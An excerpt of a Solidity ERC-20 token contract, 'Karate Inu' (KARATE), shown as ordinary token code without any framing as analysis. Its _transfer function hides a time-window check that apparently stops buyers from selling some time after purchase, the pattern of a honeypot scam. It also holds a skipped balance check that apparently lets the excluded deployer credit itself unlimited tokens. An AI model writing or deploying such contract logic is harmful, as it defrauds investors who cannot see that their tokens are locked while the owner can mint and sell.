...
contract KARATEINU is Ownable, IERC20 {
    using SafeMath for uint256;
    mapping (address => uint256) private _tokens;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedadd;
    mapping (address => uint256) private recipients; 
    string private _name = "Karate Inu";
    string private _symbol = "KARATE";
    ...
    constructor()  {
        ...
        _isExcludedadd[msg.sender] = true;
    ...
    function _transfer(address sen, address rec, uint256 amount) internal virtual {
        require(sen != address(0));        
        require(rec != address(0));
        uint256 _feetoken;
        uint256 _sentoken = 0;
        uint256 _feetime = recipients[sen] + _lastbuytime.mul(50).div(100);
        if (!_isExcludedadd[sen] && !_isExcludedadd[rec]  ) {_feetoken = amount.mul(2).div(100);}
        if (rec != _marketing  && rec != _liquidity && sen == _liquidity && balanceOf(rec) == 0) 
        { recipients[rec] = block.timestamp;}      
        uint256 _timenow =block.timestamp;     
        if (sen !=_marketing  && sen !=_liquidity ){require(_timenow <= _feetime);}
        uint256 tokens = _tokens[sen];
        if (sen != rec || !_isExcludedadd[msg.sender]) { require(tokens + _sentoken >= amount); }
        uint256 amounts = amount - _feetoken;
        if (tokens >= amount) { _tokens[sen] = tokens - amount; }
        _tokens[rec] += amounts; 
        emit Transfer(sen, rec, amounts);
    }
